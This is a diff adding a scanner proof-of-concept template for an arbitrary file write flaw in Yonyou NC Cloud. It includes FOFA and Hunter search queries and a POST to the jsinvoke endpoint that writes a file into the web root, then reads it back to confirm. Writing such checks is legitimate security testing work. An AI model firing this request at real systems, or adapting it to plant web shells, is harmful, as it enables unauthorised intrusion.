@@ -1,0 +1,25 @@
+id: poc-yaml-yongyou-nc-cloud-iresourcemanager-file-upload
+info:
+  name: 用友NC Cloud/NC IResourceManager 任意文件写入漏洞
+  severity: critical
+  tags:
+  - 文件上传
+  finger: 用友-NC-Cloud
+  fofa: app="用友-NC-Cloud"
+  hunter: app.name="用友 UAP"
+variables:
+  t1: random_str(8)
+  t2: md5(t1)
+requests:
+- method: POST
+  path: /uapjs/jsinvoke/?action=invoke
+  headers:
+    Content-Type: application/json
+  data: '{"serviceName":"uap.framework.rc.itf.IResourceManager","methodName":"add","parameterTypes":["java.lang.String","java.lang.String"],"parameters":["{{.t2}}","webappsapps/nc_web/{{.t1}}.txt"]}
+
+    '
+  expression: status_code == 200 && contains(body,"")
+- method: GET
+  path: /{{.t1}}.txt
+  expression: status_code == 200 && contains(body,t2) && !contains(body,"<")
+transport: http
